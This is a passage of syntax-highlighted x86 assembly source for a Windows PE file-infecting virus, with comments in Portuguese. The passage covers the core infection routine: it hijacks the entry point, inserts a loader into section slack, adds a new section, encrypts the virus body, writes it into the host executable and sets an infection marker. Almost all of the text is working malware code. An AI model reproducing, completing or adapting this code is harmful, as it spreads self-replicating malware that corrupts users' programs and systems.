       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GPA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">;todas 3 APIs foram obtidas?</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">fudeu</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">host_createthread</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">fudeu</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.NT_FileHeader.FH_NumberOfSections</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_HEADERS</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">3</span><span class="sc4">))-</span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">fim_loader</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">loader</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.IMAGE_SIZEOF_SECTION_HEADER.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.IMAGE_SIZEOF_SECTION_HEADER.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">fudeu</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">fudeu</span><span class="sc0">                                </span><span class="sc1">;pouco espaáo de "slack"</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                 </span><span class="sc1">;edx=tamanho da primeira seá∆o</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.IMAGE_SIZEOF_SECTION_HEADER.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lugarloader</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.IMAGE_SIZEOF_SECTION_HEADER.SH_VirtualSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">;aumenta pro loader</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.IMAGE_SIZEOF_SECTION_HEADER.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.NT_OptionalHeader.OH_AddressOfEntryPoint</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;entrypoint=0</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">fudeu</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.NT_OptionalHeader.OH_AddressOfEntryPoint</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">;calcula salto relativo</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">fim_loader</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">loader</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.NT_OptionalHeader.OH_ImageBase</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">entrypoint</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">endereco_host</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">segue_correcao</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.IMAGE_SIZEOF_SECTION_HEADER.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tsecao</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tsecao</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.IMAGE_SIZEOF_SECTION_HEADER.SH_Name</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">chave</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f0f0f0fh</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"AAAA"</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">17</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f0f0f0fh</span><span class="sc0">                       </span><span class="sc1">;inicia criaá∆o da nova seá∆o</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"AAAA"</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.IMAGE_SIZEOF_SECTION_HEADER.SH_Characteristics</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IMAGE_SCN_MEM_WRITE</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> \
           </span><span class="sc5">IMAGE_SCN_MEM_READ</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">IMAGE_SCN_CNT_INITIALIZED_DATA</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">alinha_file</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.IMAGE_SIZEOF_SECTION_HEADER.SH_PointerToRawData</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">escreve</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">;onde vamos escrever o virus</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">alinha_mem</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.IMAGE_SIZEOF_SECTION_HEADER.SH_VirtualAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.NT_OptionalHeader.OH_ImageBase</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">para_correcao</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">virus_pointer</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">entrada</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">v_ini</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vofs</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                          </span><span class="sc1">;onde vai estar o codigo encriptado</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">segue_correcao</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">v_fim</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">v_ini</span><span class="sc4">)*</span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">alinha_file</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.IMAGE_SIZEOF_SECTION_HEADER.SH_SizeOfRawData</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">escreve</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tamanho_total</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;tamanho final do arquivo</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">alinha_mem</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.IMAGE_SIZEOF_SECTION_HEADER.SH_VirtualSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.IMAGE_SIZEOF_SECTION_HEADER.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">alinha_mem</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.NT_OptionalHeader.OH_SizeOfImage</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">ja_ta</span><span class="sc0">                                </span><span class="sc1">;arquivo j† Ç grande suficiente?</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.NT_OptionalHeader.OH_SizeOfImage</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
  </span><span class="sc5">ja_ta</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.NT_OptionalHeader.OH_CheckSum</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">infectou?</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">pe_ptr</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                 </span><span class="sc1">;vai atÇ PE header-4</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetFilePointer</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">temp</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">marca</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                 </span><span class="sc1">;escreve marca de infeá∆o</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WriteFile</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">temp</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_HEADERS</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                 </span><span class="sc1">;escreve pe header modificado</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WriteFile</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_HEADERS</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">3</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">temp</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tsecao</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                 </span><span class="sc1">;escreve SectionHeaders</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WriteFile</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lugarloader</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                 </span><span class="sc1">;vai pro final da 1ß seá∆o</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetFilePointer</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">temp</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">fim_loader</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">loader</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">loader</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                 </span><span class="sc1">;escreve o loader</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WriteFile</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MEM_RESERVE</span><span class="sc4">+</span><span class="sc5">MEM_COMMIT</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">v_fim</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">v_ini</span><span class="sc4">)*</span><span class="sc2">4</span><span class="sc0">             </span><span class="sc1">;pega memoria pra encriptar virus</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VirtualAlloc</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;       test eax, eax                           ;se falhar, fudeu pra valer!</span><span class="sc0">
</span><span class="sc1">;       jz $</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MEM_RELEASE</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;parÉmetros pra liberar memoria</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">v_ini</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">entrada</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">v_ini</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                                </span><span class="sc1">;copia desencriptador</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                 </span><span class="sc1">;salva handle do arquivo</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">v_fim</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">entrada</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">chave</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc5">encripta</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                                    </span><span class="sc1">;guarda quociente</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                                    </span><span class="sc1">;guarda resto</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">encripta</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">escreve</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                 </span><span class="sc1">;vai pra nossa seá∆o</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetFilePointer</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">temp</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">v_fim</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">entrada</span><span class="sc4">)*</span><span class="sc2">2</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">entrada</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">v_ini</span><span class="sc4">))</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                 </span><span class="sc1">;escreve o virus</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WriteFile</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VirtualFree</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;libera memoria</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tamanho_total</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                 </span><span class="sc1">;vai atÇ novo final</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetFilePointer</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                 </span><span class="sc1">;marca final do arquivo</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetEndOfFile</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc5">fudeu</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_HEADERS</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rnd</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                 </span><span class="sc1">;esi+=8</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
